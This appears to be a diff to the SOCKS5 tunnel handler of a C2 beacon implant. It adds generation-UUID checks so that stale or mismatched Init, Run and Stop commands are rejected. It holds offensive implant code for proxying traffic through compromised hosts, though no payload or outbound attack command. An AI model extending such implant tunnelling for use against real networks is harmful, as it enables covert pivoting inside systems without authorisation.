@@ -801,12 +801,26 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
     }
     else if (c2Message.cmd() == StopSocksCmd)
     {
-        m_socksTunnelClient.clear();
+        if (!c2Message.uuid().empty() && c2Message.uuid() == m_socksRouteGeneration)
+        {
+            m_socksTunnelClient.clear();
+            m_socksRouteGeneration.clear();
+        }
         return false;
     }
     else if (c2Message.cmd() == InitCmd)
     {
         SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
+        if (c2Message.uuid().empty())
+        {
+            c2RetMessage.set_data("fail:invalid_generation");
+            return false;
+        }
+        if (m_socksRouteGeneration != c2Message.uuid())
+        {
+            m_socksTunnelClient.clear();
+            m_socksRouteGeneration = c2Message.uuid();
+        }
         auto existing = std::find_if(
             m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
             [&](const auto& tunnel) {
@@ -852,6 +866,11 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
     }
     else if (c2Message.cmd() == RunCmd)
     {
+        if (c2Message.uuid().empty() || c2Message.uuid() != m_socksRouteGeneration)
+        {
+            c2RetMessage.set_cmd(StopCmd);
+            return false;
+        }
         SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());
         for (int i = 0; i < m_socksTunnelClient.size(); i++)
         {
@@ -887,6 +906,8 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
     }
     else if (c2Message.cmd() == StopCmd)
     {
+        if (c2Message.uuid().empty() || c2Message.uuid() != m_socksRouteGeneration)
+            return false;
         SPDLOG_DEBUG("Socks5 stop {}", c2Message.pid());
         for (int i = 0; i < m_socksTunnelClient.size(); i++)
         {
